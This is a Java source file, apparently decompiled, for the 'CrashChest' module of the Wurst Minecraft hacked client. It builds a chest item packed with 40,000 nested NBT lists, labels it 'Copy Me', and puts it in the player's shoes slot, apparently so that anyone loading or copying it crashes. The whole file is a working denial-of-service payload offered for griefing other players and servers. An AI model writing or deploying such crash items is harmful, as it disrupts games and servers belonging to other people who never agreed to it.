package net.wurstclient.hacks;

import net.minecraft.class_1304;
import net.minecraft.class_1799;
import net.minecraft.class_1935;
import net.minecraft.class_2246;
import net.minecraft.class_2487;
import net.minecraft.class_2499;
import net.minecraft.class_2520;
import net.minecraft.class_2561;
import net.minecraft.class_9279;
import net.minecraft.class_9334;
import net.wurstclient.Category;
import net.wurstclient.SearchTags;
import net.wurstclient.hack.Hack;
import net.wurstclient.util.ChatUtils;

@SearchTags(value={"crash chest"})
public final class CrashChestHack
extends Hack {
    public CrashChestHack() {
        super("CrashChest");
        this.setCategory(Category.ITEMS);
    }

    @Override
    protected void onEnable() {
        if (!CrashChestHack.MC.field_1724.method_31549().field_7477) {
            ChatUtils.error("Creative mode only.");
            this.setEnabled(false);
            return;
        }
        if (!CrashChestHack.MC.field_1724.method_6118(class_1304.field_6166).method_7960()) {
            ChatUtils.error("Please clear your shoes slot.");
            this.setEnabled(false);
            return;
        }
        class_1799 stack = new class_1799((class_1935)class_2246.field_10034);
        class_2487 nbtCompound = new class_2487();
        class_2499 nbtList = new class_2499();
        for (int i = 0; i < 40000; ++i) {
            nbtList.add((Object)new class_2499());
        }
        nbtCompound.method_10566("www.wurstclient.net", (class_2520)nbtList);
        stack.method_57379(class_9334.field_49628, (Object)class_9279.method_57456((class_2487)nbtCompound));
        stack.method_57379(class_9334.field_49631, (Object)class_2561.method_43470((String)"Copy Me"));
        CrashChestHack.MC.field_1724.field_56535.method_66660(class_1304.field_6166, stack);
        ChatUtils.message("Item has been placed in your shoes slot.");
        this.setEnabled(false);
    }
}
